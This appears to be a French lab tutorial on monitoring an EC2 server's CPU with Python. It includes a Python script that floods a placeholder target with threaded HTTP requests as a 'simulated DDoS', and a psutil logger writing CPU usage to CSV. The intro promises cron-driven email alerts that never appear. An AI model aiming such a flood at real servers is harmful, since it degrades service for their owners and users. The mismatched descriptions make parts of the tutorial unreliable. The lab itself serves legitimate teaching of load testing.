---
# Tutoriel: Surveillance des Performances d'un serveur EC2 avec Python et simulation d'attaques DDOS
Ce tutoriel explique comment mettre en place un système de surveillance des performances du serveur en utilisant Python et Cron. Le script Python envoie un email avec les détails des performances du serveur à un administrateur système toutes les minutes.


### Installation de Python et des dépendances

#### installation_python.sh

```bash
sudo yum install python3  # Installe Python 3
sudo yum install python3-pip  # Installe pip pour Python 3
sudo pip3 install requests  # Installe la bibliothèque requests
sudo pip3 install psutil  # Installe la bibliothèque psutil
python3 --version  # Vérifie la version de Python 3 installée
python3 -c "import requests; print(requests.__version__)"  # Vérifie la version de requests installée
python3 -c "import psutil; print(psutil.__version__)"  # Vérifie la version de psutil installée
```

- `sudo yum install python3`: Installe Python 3 à l'aide de `yum`.
- `sudo yum install python3-pip`: Installe pip pour Python 3 via `yum`.
- `sudo pip3 install requests`: Installe la bibliothèque Python `requests` pour effectuer des requêtes HTTP.
- `sudo pip3 install psutil`: Installe la bibliothèque Python `psutil` pour récupérer les informations sur le système et le processeur.
- `python3 --version`: Affiche la version de Python 3 installée.
- `python3 -c "import requests; print(requests.__version__)"`: Vérifie la version de la bibliothèque `requests` installée.
- `python3 -c "import psutil; print(psutil.__version__)"`: Vérifie la version de la bibliothèque `psutil` installée.

---

### Script de l'attaque DDoS simulée

#### DDOS_attack.py

```python
import requests
import concurrent.futures
import time

# Adresse IP ou URL du serveur cible à attaquer
target_server = 'http://<Adresse_IP_du_server_1>'

# Nombre de requêtes par canal (thread)
requests_per_channel = 100

# Nombre total de canaux (threads) à utiliser
num_channels = 10

# Fonction pour envoyer des requêtes HTTPS au serveur cible
def send_requests():
    for _ in range(requests_per_channel):
        try:
            response = requests.get(target_server)
            print(f"Request sent to {target_server} | Status code: {response.status_code}")
        except Exception as e:
            print(f"Request failed: {str(e)}")

# Fonction principale pour lancer les canaux simultanément
def launch_attack():
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_channels) as executor:
        futures = [executor.submit(send_requests) for _ in range(num_channels)]
        concurrent.futures.wait(futures)

# Lancement de l'attaque DDoS
if __name__ == '__main__':
    print(f"Launching DDoS attack on {target_server}...")
    launch_attack()
```

- `target_server`: Définit l'adresse IP ou l'URL du serveur cible à attaquer.
- `requests_per_channel`: Nombre de requêtes par canal (thread).
- `num_channels`: Nombre total de canaux (threads) à utiliser pour l'attaque.
- `send_requests()`: Fonction qui envoie des requêtes HTTPS répétées au serveur cible.
- `launch_attack()`: Fonction principale qui lance plusieurs threads simultanément pour envoyer les requêtes.
- `if __name__ == '__main__':`: Point d'entrée du script qui lance l'attaque DDoS sur le serveur cible spécifié.

---

### Surveillance des performances CPU

#### cpu_performance.py

```python
import psutil
import csv
import time

# Chemin du fichier CSV pour enregistrer les performances
csv_file = '/home/ec2-user/lab10_cpu_performance/performance.csv'

# Fonction pour récupérer les informations sur le CPU
def get_cpu_stats():
    cpu_percent = psutil.cpu_percent(interval=None)  # Utilisation du CPU en pourcentage
    timestamp = int(time.time())  # Timestamp actuel
    return timestamp, cpu_percent

# Fonction pour écrire les données dans un fichier CSV
def write_to_csv(timestamp, cpu_percent):
    with open(csv_file, mode='a') as file:
        writer = csv.writer(file, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
        writer.writerow([timestamp, cpu_percent])

# Boucle principale pour surveiller toutes les deux secondes
while True:
    timestamp, cpu_percent = get_cpu_stats()
    write_to_csv(timestamp, cpu_percent)
    time.sleep(2)  # Attente de deux secondes avant la prochaine lecture
```

- `csv_file`: Chemin du fichier CSV où les données de performance du CPU seront enregistrées.
- `get_cpu_stats()`: Fonction qui utilise `psutil` pour récupérer le pourcentage d'utilisation du CPU et le timestamp actuel.
- `write_to_csv(timestamp, cpu_percent)`: Fonction qui écrit les données récupérées dans le fichier CSV spécifié.
- Boucle principale `while True`: Boucle infinie qui récupère périodiquement les statistiques du CPU et les enregistre dans le fichier CSV toutes les deux secondes.

---

### Conclusion

Ce tutoriel explique comment installer Python et les bibliothèques nécessaires, comment simuler une attaque DDoS en utilisant des threads pour envoyer des requêtes HTTPS multiples, et comment surveiller et enregistrer les performances du CPU dans un fichier CSV. Assurez-vous d'adapter les adresses IP, les chemins de fichier et les paramètres selon votre configuration spécifique.